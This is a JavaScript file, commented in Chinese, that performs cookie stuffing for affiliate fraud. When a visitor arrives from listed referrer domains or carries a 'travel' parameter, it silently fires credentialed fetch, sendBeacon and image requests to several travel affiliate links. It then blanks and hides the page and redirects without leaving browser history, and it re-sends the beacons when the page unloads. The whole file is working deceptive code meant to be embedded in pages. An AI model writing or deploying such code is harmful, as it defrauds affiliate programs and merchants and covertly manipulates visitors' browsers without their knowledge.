// ==================== 配置区域 ====================
// 唯一跳转目标
const TARGET_URL = "https://kiwi.tpk.mx/c3p3hsnR";

// Cookie追踪配置 - 跳转前植入这些cookie
const TRACKING_URLS = [
    "https://tiqets.tpk.mx/ysnIojGS", 
"https://economybookings.tpk.mx/dV1iVW87", 
"https://expedia.com/affiliate/QByD0sQ", 
    "https://radicalstorage.tpk.mx/fBQijS6S",     
    "https://airalo.tpk.mx/jiRWagEv"
];

// 授权域名列表
const AUTHORIZED_DOMAINS = [
    'globetrotgoals.com',
    'sites.google.com',
    '2025thingstodo.online',
    'localhost',
    '127.0.0.1'
];

// 追踪时间配置
const TRACKING_CONFIG = {
    maxWaitTime: 250,     // 最大等待时间
    fallbackDelay: 400,   // 兜底跳转延迟
    requestTimeout: 150,  // 单个请求超时
    debug: false          // 调试模式
};

// ==================== 优化的Cookie追踪器 ====================
class OptimizedCookieTracker {
    constructor() {
        this.trackingUrls = TRACKING_URLS;
        this.completedCount = 0;
        this.totalSites = this.trackingUrls.length;
        this.isCompleted = false;
        this.startTime = Date.now();
        this.onCompleteCallback = null;
        
        this.log('追踪器初始化', `目标站点: ${this.totalSites}个`);
    }

    log(...args) {
        if (TRACKING_CONFIG.debug) {
            console.log('[CookieTracker]', ...args);
        }
    }

    // 设置完成回调
    onComplete(callback) {
        this.onCompleteCallback = callback;
        return this;
    }

    // 开始追踪
    async startTracking() {
        if (this.totalSites === 0) {
            this.log('无追踪站点，直接完成');
            this.markComplete();
            return;
        }

        this.log('开始cookie植入');
        
        // 设置全局超时保护
        this.setGlobalTimeout();
        
        // 并行执行所有追踪请求
        const trackingPromises = this.trackingUrls.map((url, index) => 
            this.executeTracking(url, index)
        );

        try {
            // 等待所有请求完成或超时
            await Promise.allSettled(trackingPromises);
            this.log('所有追踪请求处理完成');
        } catch (error) {
            this.log('追踪过程异常:', error);
        }
    }

    // 执行单个URL的追踪
    async executeTracking(url, index) {
        this.log(`开始追踪 ${index + 1}/${this.totalSites}: ${this.shortenUrl(url)}`);
        
        // 方法1: fetch请求（最优先）
        if (await this.tryFetchMethod(url, index)) return;
        
        // 方法2: sendBeacon（备选）
        if (this.tryBeaconMethod(url, index)) return;
        
        // 方法3: Image标签（兜底）
        this.tryImageMethod(url, index);
    }

    // 尝试fetch方法
    async tryFetchMethod(url, index) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), TRACKING_CONFIG.requestTimeout);
            
            const response = await fetch(url, {
                method: "GET",
                credentials: "include",
                mode: "no-cors",
                cache: "no-cache",
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            this.log(`站点 ${index + 1} fetch成功`);
            this.onSiteComplete(index, 'fetch');
            return true;
        } catch (error) {
            if (error.name !== 'AbortError') {
                this.log(`站点 ${index + 1} fetch失败:`, error.message);
            }
            return false;
        }
    }

    // 尝试sendBeacon方法
    tryBeaconMethod(url, index) {
        if (!navigator.sendBeacon) {
            return false;
        }

        try {
            const success = navigator.sendBeacon(url, new Blob([''], {type: 'text/plain'}));
            if (success) {
                this.log(`站点 ${index + 1} beacon成功`);
                this.onSiteComplete(index, 'beacon');
                return true;
            }
        } catch (error) {
            this.log(`站点 ${index + 1} beacon失败:`, error.message);
        }
        return false;
    }

    // 尝试Image标签方法
    tryImageMethod(url, index) {
        const img = new Image();
        let completed = false;
        
        const complete = (method) => {
            if (completed) return;
            completed = true;
            this.log(`站点 ${index + 1} image ${method}`);
            this.onSiteComplete(index, `image-${method}`);
        };

        // 设置超时
        const timeoutId = setTimeout(() => complete('timeout'), TRACKING_CONFIG.requestTimeout);

        img.onload = () => {
            clearTimeout(timeoutId);
            complete('success');
        };

        img.onerror = () => {
            clearTimeout(timeoutId);
            complete('error-but-sent');
        };

        // 添加时间戳防止缓存
        img.src = url + (url.includes('?') ? '&' : '?') + '_t=' + Date.now();
    }

    // 单个站点完成回调
    onSiteComplete(index, method) {
        this.completedCount++;
        this.log(`进度: ${this.completedCount}/${this.totalSites} (${method})`);
        
        // 检查是否全部完成
        if (this.completedCount >= this.totalSites) {
            const elapsed = Date.now() - this.startTime;
            this.log(`所有追踪完成，耗时: ${elapsed}ms`);
            this.markComplete();
        }
    }

    // 设置全局超时
    setGlobalTimeout() {
        setTimeout(() => {
            if (!this.isCompleted) {
                const elapsed = Date.now() - this.startTime;
                this.log(`全局超时触发，耗时: ${elapsed}ms，已完成: ${this.completedCount}/${this.totalSites}`);
                this.markComplete();
            }
        }, TRACKING_CONFIG.maxWaitTime);
    }

    // 标记完成
    markComplete() {
        if (this.isCompleted) return;
        
        this.isCompleted = true;
        const elapsed = Date.now() - this.startTime;
        this.log(`追踪流程结束，总耗时: ${elapsed}ms`);
        
        if (this.onCompleteCallback) {
            this.onCompleteCallback();
        }
    }

    // 简化URL显示
    shortenUrl(url) {
        try {
            const domain = new URL(url).hostname;
            return domain.replace('www.', '');
        } catch {
            return url.substring(0, 30) + '...';
        }
    }
}

// ==================== 核心跳转逻辑 ====================

// 立即执行跳转检测
(function() {
    'use strict';
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            checkImmediateRedirect();
        });
    }
    
    checkImmediateRedirect();
})();

/**
 * 检查跳转条件 - 保持原逻辑
 */
function checkImmediateRedirect() {
    const urlParams = getUrlParams();
    const referrer = document.referrer;
    
    // 检查触发条件
    const hasAuthorizedDomain = isAuthorizedSource(referrer);
    const paramTriggerResult = checkParameterTrigger(urlParams);
    
    let shouldRedirect = false;
    
    if (paramTriggerResult.triggered) {
        // 优先条件：参数包含travel=任意值
        shouldRedirect = true;
    } else if (hasAuthorizedDomain) {
        // 条件2：指定域名来源
        shouldRedirect = true;
    }
    
    if (!shouldRedirect) {
        return;
    }

    // 执行带追踪的重定向
    executeTrackedRedirect();
}

/**
 * 执行带cookie追踪的重定向
 */
function executeTrackedRedirect() {
    // 记录重定向信息
    recordRedirectInfo(TARGET_URL);
    
    // 创建追踪器并设置完成回调
    const tracker = new OptimizedCookieTracker();
    
    tracker.onComplete(() => {
        // Cookie植入完成后执行跳转
        performSeamlessRedirect(TARGET_URL);
    });
    
    // 开始追踪
    tracker.startTracking();
    
    // 兜底保护 - 确保一定会跳转（即使追踪失败）
    setTimeout(() => {
        performSeamlessRedirect(TARGET_URL);
    }, TRACKING_CONFIG.fallbackDelay);
}

/**
 * 检查参数触发条件
 */
function checkParameterTrigger(urlParams) {
    const travelParam = urlParams.travel;
    
    if (!travelParam) {
        return { triggered: false };
    }
    
    // 只要有travel参数就触发，不限制具体值
    return { triggered: true };
}

/**
 * 获取URL参数
 */
function getUrlParams() {
    const params = {};
    const queryString = window.location.search.substring(1);
    
    if (!queryString) {
        return params;
    }
    
    const pairs = queryString.split('&');
    
    for (let i = 0; i < pairs.length; i++) {
        const pair = pairs[i].split('=');
        
        if (pair[0]) {
            const key = decodeURIComponent(pair[0]);
            const value = decodeURIComponent(pair[1] || '').toLowerCase().trim();
            params[key] = value;
        }
    }
    
    return params;
}

/**
 * 域名验证
 */
function isAuthorizedSource(referrer) {
    if (!referrer) {
        return false;
    }
    
    try {
        const domain = referrer.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');
        
        return AUTHORIZED_DOMAINS.some(authorizedDomain => {
            const cleanAuthorized = authorizedDomain.replace(/^www\./, '');
            return domain === cleanAuthorized || domain.endsWith('.' + cleanAuthorized);
        });
    } catch (error) {
        return false;
    }
}

/**
 * 执行无感跳转
 */
function performSeamlessRedirect(url) {
    if (!url || typeof url !== 'string' || !url.match(/^https?:\/\/.+/)) {
        return;
    }
    
    url = url.trim();
    
    // 停止当前页面加载
    try {
        window.stop && window.stop();
    } catch (e) {}
    
    // 清空页面内容，防止闪烁
    try {
        if (document.body) {
            document.body.innerHTML = '';
            document.body.style.display = 'none';
        }
    } catch (e) {}
    
    // 执行跳转 - 优先使用replace（不留历史记录）
    try {
        window.location.replace(url);
        return;
    } catch (error) {
        try {
            window.location.href = url;
            return;
        } catch (error2) {
            try {
                window.location.assign(url);
            } catch (error3) {
                fallbackRedirect(url);
            }
        }
    }
}

/**
 * 备用跳转方案
 */
function fallbackRedirect(url) {
    try {
        const form = document.createElement('form');
        form.method = 'get';
        form.action = url;
        form.style.display = 'none';
        form.target = '_self';
        
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
            if (form.parentNode) {
                form.parentNode.removeChild(form);
            }
        }, 100);
    } catch (error) {
        try {
            window.open(url, '_self');
        } catch (finalError) {
            window.location = url;
        }
    }
}

/**
 * 记录跳转信息
 */
function recordRedirectInfo(targetUrl) {
    try {
        const redirectData = {
            targetUrl: targetUrl,
            source: window.location.hostname,
            referrer: document.referrer,
            timestamp: Date.now()
        };
        
        // 可选：发送到分析服务器
        // sendToAnalytics(redirectData);
    } catch (error) {
        // 静默处理错误
    }
}

// ==================== 页面卸载保护 ====================
window.addEventListener('beforeunload', () => {
    // 页面卸载时尝试发送剩余的追踪请求
    TRACKING_URLS.forEach((url) => {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url, new Blob([''], {type: 'text/plain'}));
        }
    });
});

// ==================== 备用检查机制 ====================
setTimeout(checkImmediateRedirect, 0);

if (typeof document.addEventListener !== 'undefined') {
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            checkImmediateRedirect();
        }
    });
}

// ==================== 手动跳转处理 ====================
function handleManualRedirect() {
    const urlParams = getUrlParams();
    
    // 检查参数触发条件
    const paramTriggerResult = checkParameterTrigger(urlParams);
    if (paramTriggerResult.triggered) {
        executeTrackedRedirect();
        return;
    }

    // 检查域名授权
    if (!isAuthorizedSource(document.referrer)) {
        return;
    }

    // 执行跳转
    executeTrackedRedirect();
}

// 兼容旧版本函数名
function handleDealsClick() {
    handleManualRedirect();
}

function checkAuthorizedRedirect() {
    checkImmediateRedirect();
}

// ==================== 页面优化 ====================
(function() {
    'use strict';
    
    // 尽早隐藏页面内容，实现真正无感跳转
    const style = document.createElement('style');
    style.textContent = `
        html, body {
            visibility: hidden !important;
            opacity: 0 !important;
        }
    `;
    
    if (document.head) {
        document.head.appendChild(style);
    } else if (document.documentElement) {
        document.documentElement.appendChild(style);
    }
    
    // 短暂延迟后恢复显示（如果没有跳转）
    setTimeout(function() {
        if (style.parentNode) {
            style.parentNode.removeChild(style);
        }
    }, 1000);
})();
